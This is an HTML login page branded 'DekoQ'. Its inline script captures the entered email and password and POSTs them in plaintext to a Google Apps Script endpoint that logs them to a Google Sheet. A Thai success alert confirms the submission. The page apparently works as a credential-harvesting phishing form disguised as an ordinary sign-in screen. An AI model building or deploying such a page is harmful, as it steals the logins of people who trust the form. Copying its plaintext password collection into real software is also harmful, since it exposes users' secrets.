
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>DekoQ Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #0056D8;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background-color: #fff;
      padding: 2rem;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 300px;
    }
    .login-container h1 {
      color: #0056D8;
      text-align: center;
    }
    .login-container input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .login-container button {
      width: 100%;
      padding: 10px;
      background-color: #121113;
      color: #fff;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }
    .login-container button:hover {
      background-color: #000;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h1>DekoQ</h1>
    <form id="login-form">
      <input type="email" id="email" placeholder="Email" required />
      <input type="password" id="password" placeholder="Password" required />
      <button type="submit">Submit</button>
    </form>
  </div>

  <script>
    document.getElementById("login-form").addEventListener("submit", async function(e) {
      e.preventDefault();
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      const response = await fetch("https://script.google.com/macros/s/AKfycbzAw9BNSCksFI2dXmV18V0dsbdJ-U93qgcAQ4FYnbb1gaaw_20VhCRjU8a1cDTrWhxVvg/exec", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ email, password })
      });

      if (response.ok) {
        alert("ส่งข้อมูลเข้า Google Sheet สำเร็จ!");
        e.target.reset();
      } else {
        alert("เกิดข้อผิดพลาดในการส่งข้อมูล");
      }
    });
  </script>
</body>
</html>
